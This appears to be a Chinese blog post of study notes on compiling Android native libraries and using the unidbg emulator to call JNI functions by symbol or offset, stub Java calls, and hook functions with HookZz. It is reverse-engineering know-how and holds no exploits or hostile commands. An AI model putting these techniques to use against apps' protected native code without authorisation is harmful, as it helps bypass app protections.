class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line">### 脱离编译器，使用命令行编译so</span><br><span class="line"></span><br><span class="line">- test/java/com/自定义包路径下编写MainActivity.java等代码，然后包路径下创建build文件夹，用于存放so源代码与配置文件 </span><br><span class="line"></span><br><span class="line">- 将cpp文件与CMakeLists.txt放到build文件夹下</span><br><span class="line"></span><br><span class="line">- 将androidstudio中的cmake路径添加到环境变量</span><br><span class="line"></span><br><span class="line">- 在build下创建build.sh文件，编写如下内容</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  cmake \</span><br><span class="line">  -H ./ \</span><br><span class="line">  -B ./ninja \</span><br><span class="line">  -DANDROID_ABI=armeabi-v7a \       <span class="comment">//或arm64-v8a</span></span><br><span class="line">  -DANDROID_PLATFORM=android-<span class="number">23</span> \   <span class="comment">//android-16</span></span><br><span class="line">  -DANDROID_NDK=/root/Android/Sdk/ndk/xx.xx.x \</span><br><span class="line">  -DCMAKE_TOOLCHAIN_FILE=/root/Android/Sdk/ndk/xx.xx.x/build/cmake/android.toolchain.cmake \</span><br><span class="line">  -G Ninja</span><br><span class="line">  ninja -C ./ninja</span><br></pre></td></tr></table></figure><ul><li><p>修改CMakeLists.txt文件，添加如下配置</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">ser</span><span class="params">(CMAKE_LIBRARY_OUTPUT_DIRECTORY $&#123;PROJECT_SOURCE_DIR&#125;/ ../)</span></span></span><br><span class="line"><span class="function"><span class="title">set</span><span class="params">(CMAKE_BUILD_TYPE <span class="string">&quot;Release&quot;</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">set</span><span class="params">(CMAKE_C_FLAGS_RELEASE <span class="string">&quot;$&#123;CMAKE_C_FLAGS_RELEASE&#125; -s&quot;</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">set</span><span class="params">(CMAKE_CXX_FLAGS_RELEASE <span class="string">&quot;$&#123;CMAKE_CXX_FLAGS_RELEASE&#125; -s&quot;</span>)</span></span></span><br></pre></td></tr></table></figure></li><li><p>运行build.sh命令 生成so则成功</p></li></ul><h2 id="Unidbg入门基础框架">Unidbg入门基础框架</h2><ol><li><p><strong>callStaticJniMethodObject</strong><br>比callFunction多封装了一些代码 不需要自己寻找函数地址 不需要自己包装参数<br>(像这种调用函数的接口函数 无论调用静态还是动态都可以用Static)</p></li><li><p><strong>通过符号寻找函数地址的过程</strong></p><p>通过传入的符号在动态注册函数中寻找函数地址，nativesMap如果找不到，则按静态注册规则拼接符号，然后寻找函数地址 函数名和函数签名</p></li><li><p>对传入的参数进行包装的过程</p></li></ol><h3 id="当返回值和参数有字节数组时">当返回值和参数有字节数组时</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] callFunc()&#123;</span><br><span class="line">    <span class="type">byte</span>[] data = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">16</span>];</span><br><span class="line">        <span class="type">ByteArray</span> <span class="variable">array</span> <span class="operator">=</span> TTEncryptUtils.callStaticJniMethodObject(emulator, <span class="string">&quot;ttEncrypt([BI)[B&quot;</span>, <span class="keyword">new</span> <span class="title class_">ByteArray</span>(vm, data), data.length); <span class="comment">// 执行Jni方法</span></span><br><span class="line">        <span class="keyword">return</span> array.getValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用Unidbg的API==》ByteArray进行包装 使用getValue方法来获得java的类型byte[]</p><p>打印java字节数组：Inspector.<em>inspect</em>(返回值, 标签);</p><p><strong>在新版本当中可以不用主动包装byte[]，String，项目已经给用户包装过了</strong></p><h3 id="当返回值和参数是int时">当返回值和参数是int时</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">retval</span> <span class="operator">=</span> NativeHelper.callStaticJniMethodInt(emulator, <span class="string">&quot;add(III)I&quot;</span>, <span class="number">0x100</span>,<span class="number">0x200</span>,<span class="number">0x300</span>); <span class="comment">// 执行Jni方法</span></span><br><span class="line">      <span class="keyword">return</span> retval;</span><br></pre></td></tr></table></figure><p><strong>Integer.toHexString()</strong>：变为十六进制形式</p><h3 id="当返回值和参数是String时">当返回值和参数是String时</h3><p>对String进行包装 new StringObject(vm,“xxxx”);</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">callFunc</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">StringObject</span> <span class="variable">md5Result</span> <span class="operator">=</span> NativeHelper.callStaticJniMethodObject(emulator, <span class="string">&quot;md5(Ljava/lang/String;)Ljava/lang/String;&quot;</span>, <span class="keyword">new</span> <span class="title class_">StringObject</span>(vm,<span class="string">&quot;xxx&quot;</span>)); <span class="comment">// 执行Jni方法</span></span><br><span class="line">        System.out.println(<span class="string">&quot;md5Result：&quot;</span>+md5Result.getValue());</span><br><span class="line">&#125;  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当unidbg模拟执行JNI函数时遇到CallObjectMethod时，会报错因为unidbg没有实现这个JNI接口</p><p>最简单的方式如下：</p><p>在适当位置加入</p><p><code>vm.setJni(new AbstractJni()&#123;&#125;);</code></p><p>(CallObjectMethod最终也是调用CallObjectMethodV)</p><h3 id="处理so调用系统java类">处理so调用系统java类</h3><ol><li>unidbg实现了大部分的JNI函数，对于没有实现的需要自己来实现</li><li>已经实现的 类似CallObjectMethodV，需要自己分析so 做有针对的覆写</li><li>通过vm.setjni(this)覆写父类AbstractJni方法</li><li>如果so通过JNI访问比较多的Java类 后者IDA反编译的so逻辑不是很清楚 比如存在混淆，这时可以借助Jnitrace来补</li></ol><p>对于需要自己分析so，做有针对性的覆写（如callObjectMethodV）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">vm.setJni(<span class="keyword">new</span> <span class="title class_">AbstractJni</span>() &#123;  <span class="comment">//重写接口</span></span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="keyword">public</span> DvmObject&lt;?&gt; callObjectMethodV(BaseVM vm, DvmObject&lt;?&gt; dvmObject, String signature, VaList vaList) &#123;</span><br><span class="line">              System.out.println(<span class="string">&quot;signature: &quot;</span> + signature); <span class="comment">//返回签名</span></span><br><span class="line">              <span class="keyword">if</span>(signature.equals(<span class="string">&quot;java/lang/String-&gt;getBytes(Ljava/lang/String;)[B&quot;</span>)) &#123;<span class="comment">//如果是要找的类下的方法</span></span><br><span class="line">                  <span class="type">String</span> <span class="variable">args</span> <span class="operator">=</span> (String) dvmObject.getValue(); <span class="comment">//返回参数</span></span><br><span class="line">                  System.out.println(<span class="string">&quot;args: &quot;</span> + args);</span><br><span class="line">                  <span class="comment">//byte[] strBytes = args.getBytes();</span></span><br><span class="line">                  <span class="type">byte</span>[] strBytes = <span class="string">&quot;unidbg&quot;</span>.getBytes(); <span class="comment">//修改返回值</span></span><br><span class="line">                  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ByteArray</span>(vm, strBytes);</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">return</span> <span class="built_in">super</span>.callObjectMethodV(vm, dvmObject, signature, vaList);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;);</span><br></pre></td></tr></table></figure><p>对于使用vm.setjni(this)覆写父类AbstractJni方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注意：类要继承AbstractJni 向上转型</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NativeHelper</span> <span class="keyword">extends</span> <span class="title class_">AbstractJni</span> &#123;</span><br><span class="line">    <span class="comment">//此处省略</span></span><br><span class="line">    vm = emulator.createDalvikVM(); <span class="comment">// 创建Android虚拟机</span></span><br><span class="line">vm.setJni(<span class="built_in">this</span>);</span><br><span class="line">    <span class="comment">//后面省略</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//然后在后面随意位置 </span></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> DvmObject&lt;?&gt; callObjectMethodV(BaseVM vm, DvmObject&lt;?&gt; dvmObject, String signature, VaList vaList) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;signature: &quot;</span> + signature);</span><br><span class="line">        <span class="keyword">if</span>(signature.equals(<span class="string">&quot;java/lang/String-&gt;getBytes(Ljava/lang/String;)[B&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">args</span> <span class="operator">=</span> (String) dvmObject.getValue();</span><br><span class="line">            System.out.println(<span class="string">&quot;args: &quot;</span> + args);</span><br><span class="line">            <span class="comment">//byte[] strBytes = args.getBytes();</span></span><br><span class="line">            <span class="type">byte</span>[] strBytes = <span class="string">&quot;unidbg&quot;</span>.getBytes();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ByteArray</span>(vm, strBytes);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.callObjectMethodV(vm, dvmObject, signature, vaList);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="处理so调用其他so">处理so调用其他so</h3><ul><li>如果被调用的函数需要先执行JNI_OnLoad或者其他函数 那么就按顺序调用</li><li>如果so中调用了其他的so 只需要按顺序加载所需要的so即可</li><li>dlopen会自己处理 <a href="http://xn--unidbglibdl-g68q84a833bcqpvw7s.so">因为unidbg加载了libdl.so</a></li><li>c/c++标准库也会自己处理 <a href="http://xn--unidbglibc-xx2pw2a830b8oos50s.so">因为unidbg加载了libc.so</a> <a href="http://libc++.so">libc++.so</a></li></ul><p>xjb：21课时</p><p>本次案例hook掉encode函数，他是动态注册的，所以unidbg开启JNI_OnLoad函数，但是还是出错。</p><p>报错Illegal JNI version:0xffffffff</p><p>观察.so文件中的JNI_OnLoad函数，发现一个bssFunc函数，跟进发现他是一个导入函数(<a href="http://xn--9orq4j6toqwo1nn.so">来自另外的.so</a>)</p><p>那我们就要在要hook的.so文件加载前加载导入函数所在的.so文件。</p><p><code>DalvikModule dm = vm.loadLibrary(new File(&quot;unidbg-android/src/test/java/包路径/.so文件名&quot;), false);</code></p><p>当使用dlopen时候，unidbg会自动处理(<a href="http://xn--unidbglibdl-g68qn31g9e4c3uxa6p7agw5g.so">因为unidbg源码里有libdl.so</a>)</p><ul><li>一些注意事项</li></ul><ol><li>如果hook的方法不在同一个class下，要使用多个’vm.resolveClass’来加载类</li></ol><p>或者 直接使用module.callFunction()。</p><p>2.如果函数在多个so中，就需要加载多个so</p><p>3.在加载我们的so之前，unidbg还加载了一些系统so，可以使用标准C函数，dlopen函数等</p><p>4.纯so的代码本来就可以执行的</p><p>5.JNI函数也实现了一些，有一部分JNI函数需要手动接管</p><p>6.将unidbg日志公开，观察信息。</p><p>​      src/test/resources/log4j.properties中的INFO全改为DEBUG</p><h3 id="通过符号调用函数1">通过符号调用函数1</h3><p>xjb:23课时</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">callFunc</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//获取到symbol最好先判断是否null</span></span><br><span class="line">    <span class="type">Symbol</span> <span class="variable">symbol</span> <span class="operator">=</span> <span class="keyword">module</span>.findSymbolByName(<span class="string">&#x27;汇编中的函数符号名&#x27;</span>);</span><br><span class="line">    <span class="comment">//返回Number[]，其中第0个成员是返回值</span></span><br><span class="line">    Number[] numbers = symbol.call(emulator,vm.getJNIEnv(),vm.addLocalObject(NativeHelper)，<span class="number">100</span>,<span class="number">200</span>,<span class="number">300</span>);<span class="comment">//写参数的时候看ida中函数参数，要写JniEnv</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">retval</span> <span class="operator">=</span> numbers[<span class="number">0</span>].intValue(); <span class="comment">//Number中结果也是包装过的</span></span><br><span class="line">    System.out.println(retval);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="得到Java的int数据后，根据这个数据去内存中捞对象或者数据">得到Java的int数据后，根据这个数据去内存中捞对象或者数据</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">callFunc</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//获取到symbol最好先判断是否null</span></span><br><span class="line">    <span class="type">Symbol</span> <span class="variable">symbol</span> <span class="operator">=</span> <span class="keyword">module</span>.findSymbolByName(<span class="string">&#x27;_Z7_strcatP7_JNIEnvP7_jclass&#x27;</span>);</span><br><span class="line">    <span class="comment">//返回Number[]，其中第0个成员是返回值</span></span><br><span class="line">    Number[] numbers = symbol.call(emulator,vm.getJNIEnv(),vm.addLocalObject(NativeHelper));<span class="comment">//写参数的时候看ida中函数参数，要写JniEnv</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> numbers[<span class="number">0</span>].intValue();</span><br><span class="line">    System.out.println(vm.getObject(result).getValue());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>比如返回的是java对象</p><p>vm.getObject(retval)  ==&gt;  相当于vm.addLocalObject反过程</p><p>比如返回是地址</p><p>emulator.getMemory().pointer(retval).getByteArray(… , …);</p><p>比如返回的是长度</p><p>emulator.getMemory().getByteArray(… , retval);</p><h3 id="通过符号调用函数2">通过符号调用函数2</h3><p>xjb第24课时</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">callFunc</span><span class="params">()</span> &#123;</span><br><span class="line">     <span class="type">Number</span> <span class="variable">numbers</span> <span class="operator">=</span> <span class="keyword">module</span>.callFunction(emulator, <span class="string">&quot;_Z7_strcatP7_JNIEnvP7_jclass&quot;</span>, vm.getJNIEnv(), vm.addLocalObject(NativeHelper));</span><br><span class="line">       <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> numbers.intValue();</span><br><span class="line">       System.out.println(vm.getObject(result).getValue());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>模拟callStaticJniMethodObject()的功能：</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.找到符号对应的地址</span><br><span class="line"><span class="number">2</span>.包装传入参数</span><br><span class="line"><span class="number">3</span>.Java类型的传递</span><br><span class="line"><span class="number">3.1</span>JNIEnv*的获取</span><br><span class="line">   vm<span class="selector-class">.getJNIEnv</span>()</span><br><span class="line"><span class="number">3.2</span> jclass/jobject的构建</span><br><span class="line">   DvmClass xxx = vm<span class="selector-class">.resolveClass</span>(...)</span><br><span class="line">   DvmObject xxxx = xxx<span class="selector-class">.newObject</span>(null)</span><br><span class="line">   vm<span class="selector-class">.addLocalObject</span>(xxx) <span class="comment">//java类或者对象以引用的方式传入</span></span><br><span class="line">   </span><br><span class="line">DvmObject obj = xxx<span class="selector-class">.newObject</span>(null)</span><br><span class="line">System<span class="selector-class">.out</span><span class="selector-class">.println</span>(vm<span class="selector-class">.addLocalObject</span>(obj)) &lt;==&gt; System<span class="selector-class">.out</span><span class="selector-class">.println</span>(obj<span class="selector-class">.hashCode</span>())</span><br></pre></td></tr></table></figure><h3 id="通过偏移调用函数">通过偏移调用函数</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">callFunc</span><span class="params">()</span>&#123;</span><br><span class="line">    Number number=<span class="keyword">module</span>.callFunction(emulator,<span class="number">0x1B4C</span>,vm.getJNIEnv(), vm.addLocalObject(NativeHelper));</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> number.intValue();</span><br><span class="line">        System.out.println(vm.getObject(result).getValue());</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><strong>2.实现md5</strong></p><p>C语言类型的传递，通过内存处理</p><ul><li>memory.malloc(16).getPointer()</li><li>memory下属很多操作内存的方法</li><li>pointer下属很多操作内存的方法</li><li>MD5_CTX不需要特别的定义 只需给他足够的内存即可 结构体实际上就是一段连续的内存且结构体中存在内存对齐</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">typedef struct&#123;</span><br><span class="line">    unsigned <span class="type">int</span> count[<span class="number">2</span>];  <span class="comment">//长度</span></span><br><span class="line">    unsigned <span class="type">int</span> state[<span class="number">4</span>];  <span class="comment">//初始化魔数</span></span><br><span class="line">    unsigned <span class="type">char</span> buffer[<span class="number">64</span>]; <span class="comment">//明文数据</span></span><br><span class="line">&#125;MD5_CTX; </span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">callFunc</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//MD5Init 调用MD5Init来完成内存开辟即填充数据</span></span><br><span class="line">    <span class="comment">//申请空间 false不需要按页分配</span></span><br><span class="line">    <span class="type">UnidbgPointer</span> <span class="variable">MD5Ctx</span> <span class="operator">=</span> emulator.getMemory().malloc(<span class="number">200</span>, <span class="literal">false</span>).getPointer();</span><br><span class="line">        <span class="keyword">module</span>.callFunction(emulator,<span class="number">0x2230</span>,MD5Ctx); <span class="comment">//调用函数 </span></span><br><span class="line">        <span class="comment">//md5Update</span></span><br><span class="line">        <span class="type">UnidbgPointer</span> <span class="variable">plainText</span> <span class="operator">=</span> emulator.getMemory().malloc(<span class="number">200</span>, <span class="literal">false</span>).getPointer();</span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="string">&quot;adgbuawhi&quot;</span>.getBytes();</span><br><span class="line">        plainText.write(buffer);</span><br><span class="line">        <span class="keyword">module</span>.callFunction(emulator,<span class="number">0x22A0</span>,MD5Ctx,plainText,buffer.length);</span><br><span class="line">        <span class="comment">//MD5Final</span></span><br><span class="line">        <span class="type">UnidbgPointer</span> <span class="variable">cipherText</span> <span class="operator">=</span> emulator.getMemory().malloc(<span class="number">200</span>, <span class="literal">false</span>).getPointer();</span><br><span class="line">        <span class="keyword">module</span>.callFunction(emulator,<span class="number">0x3A78</span>,MD5Ctx,cipherText);</span><br><span class="line">        <span class="type">byte</span>[] byteArray = cipherText.getByteArray(<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">        Inspector.inspect(byteArray,<span class="string">&quot;MD5Result&quot;</span>);</span><br><span class="line">        <span class="comment">//Inspector.inspect(数据，label);</span></span><br><span class="line">&#125;</span><br><span class="line">        </span><br></pre></td></tr></table></figure><h3 id="unidbg中的Hook">unidbg中的Hook</h3><ul><li>unidbg支持dobby，hookzz，whale，xhook</li><li>hookzz是dobby的前身，hookzz对32位支持较好，dobby对64位支持较好</li><li>unidbg支持Unicorn自带的各种Hook(指令级hook，块级hook，内存读写hook，异常hook)以及unidbg封装后的console debuger</li><li>原生unicorn hook不容易被检测，console debuger可下多个断点 用于快速验证</li><li>RegisterContext和Arm64RegisterContext，Arm32RegisterContext用法一样，但是Arm32/64RegisterContext可以使用寄存器</li><li>unidbg没法处理子线程中的操作 Hook相应位置，把子线程计算结果赋值给寄存器</li></ul><h3 id="Hookzz的简单使">Hookzz的简单使</h3><p>Hook MD5Update</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">callFunc</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">IHookZz</span> <span class="variable">hookZz</span> <span class="operator">=</span> HookZz.getInstance(emulator); <span class="comment">// 加载HookZz，支持inline hook，文档看https://github.com/jmpews/HookZz</span></span><br><span class="line">        hookZz.enable_arm_arm64_b_branch(); <span class="comment">// 测试enable_arm_arm64_b_branch，可有可无</span></span><br><span class="line">        hookZz.wrap(<span class="keyword">module</span>.findSymbolByName(<span class="string">&quot;_Z9MD5UpdateP7MD5_CTXPhj&quot;</span>), <span class="keyword">new</span> <span class="title class_">WrapCallback</span>&lt;RegisterContext&gt;() &#123; <span class="comment">// inline wrap导出函数</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">preCall</span><span class="params">(Emulator&lt;?&gt; emulator, RegisterContext ctx, HookEntryInfo info)</span> &#123;</span><br><span class="line">                md5_ctx = ctx.getPointerArg(<span class="number">0</span>);    <span class="comment">//取指针型参数</span></span><br><span class="line">                <span class="type">Pointer</span> <span class="variable">plainText</span> <span class="operator">=</span> ctx.getPointerArg(<span class="number">1</span>);</span><br><span class="line">                <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> ctx.getIntArg(<span class="number">2</span>);     <span class="comment">//取int型参数</span></span><br><span class="line">                Inspector.inspect(md5_ctx.getByteArray(<span class="number">0</span>,<span class="number">64</span>), <span class="string">&quot;preCall md5_ctx&quot;</span>);</span><br><span class="line">                Inspector.inspect(plainText.getByteArray(<span class="number">0</span>,length), <span class="string">&quot;plainText&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postCall</span><span class="params">(Emulator&lt;?&gt; emulator, RegisterContext ctx, HookEntryInfo info)</span> &#123;</span><br><span class="line">                Inspector.inspect(md5_ctx.getByteArray(<span class="number">0</span>,<span class="number">64</span>), <span class="string">&quot;preCall md5_ctx&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        hookZz.disable_arm_arm64_b_branch();  <span class="comment">//可有可无</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="使用Hookzz进行Inline-Hook">使用Hookzz进行Inline Hook</h3><p>关键：instrument</p><p>xjb第28课时</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">callFunc</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="comment">//add方法</span></span><br><span class="line">    hookZz.instrument(<span class="keyword">module</span>.base + <span class="number">0x1AEC</span>, <span class="keyword">new</span> <span class="title class_">InstrumentCallback</span>&lt;Arm64RegisterContext&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dbiCall</span><span class="params">(Emulator&lt;?&gt; emulator, Arm64RegisterContext ctx, HookEntryInfo info)</span> &#123; <span class="comment">// 通过base+offset inline wrap内部函数，在IDA看到为sub_xxx那些</span></span><br><span class="line">                System.out.println(<span class="string">&quot;W8=0x&quot;</span> + Integer.toHexString(ctx.getXInt(<span class="number">8</span>)) + <span class="string">&quot;, W9=0x&quot;</span> + Integer.toHexString(ctx.getXInt(<span class="number">9</span>)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ctx.getXInt(8) ==&gt; 获得第8个寄存器的值 w8</span></span><br><span class="line"><span class="comment">//Integer.toHexString() ==&gt; 整形转化为十六进制</span></span><br></pre></td></tr></table></figure><h3 id="参数的获取">参数的获取</h3><p>xjb第29课时</p><p>hook jstring2cstr</p><ul><li>以内存写入的方式传递参数，取参数时就读内存</li><li>以addLocalObject方式传入的Java类型参数，取参数时用getObject</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">callFunc</span><span class="params">()</span>&#123;</span><br><span class="line">      <span class="type">IHookZz</span> <span class="variable">hookZz</span> <span class="operator">=</span> HookZz.getInstance(emulator); <span class="comment">// 加载HookZz，支持inline hook，文档看https://github.com/jmpews/HookZz</span></span><br><span class="line">        hookZz.enable_arm_arm64_b_branch(); <span class="comment">// 测试enable_arm_arm64_b_branch，可有可无</span></span><br><span class="line">        hookZz.wrap(<span class="keyword">module</span>.findSymbolByName(<span class="string">&quot;_Z12jstring2cstrP7_JNIEnvP8_jstring&quot;</span>), <span class="keyword">new</span> <span class="title class_">WrapCallback</span>&lt;RegisterContext&gt;() &#123; <span class="comment">// inline wrap导出函数</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">preCall</span><span class="params">(Emulator&lt;?&gt; emulator, RegisterContext ctx, HookEntryInfo info)</span> &#123;</span><br><span class="line">                <span class="comment">//jstr2cstr中是jstring类型 就反用vm.getObject</span></span><br><span class="line">                 <span class="type">int</span> <span class="variable">intArg</span> <span class="operator">=</span> ctx.getIntArg(<span class="number">1</span>);</span><br><span class="line">                 <span class="type">StringObject</span> <span class="variable">str</span> <span class="operator">=</span> vm.getObject(intArg);</span><br><span class="line">                 System.out.println(<span class="string">&quot;precall str = &quot;</span>+str.getValue());</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postCall</span><span class="params">(Emulator&lt;?&gt; emulator, RegisterContext ctx, HookEntryInfo info)</span> &#123;</span><br><span class="line">                <span class="comment">//输出返回值 因为返回值在x0/w0中</span></span><br><span class="line">                <span class="type">byte</span>[] bytes = ctx.getPointerArg(<span class="number">0</span>).getByteArray(<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">                <span class="comment">//或者使用getXPointer下的getString方法</span></span><br><span class="line">                String str= ctx.getXPointer(<span class="number">0</span>).getString(<span class="number">0</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;postCall 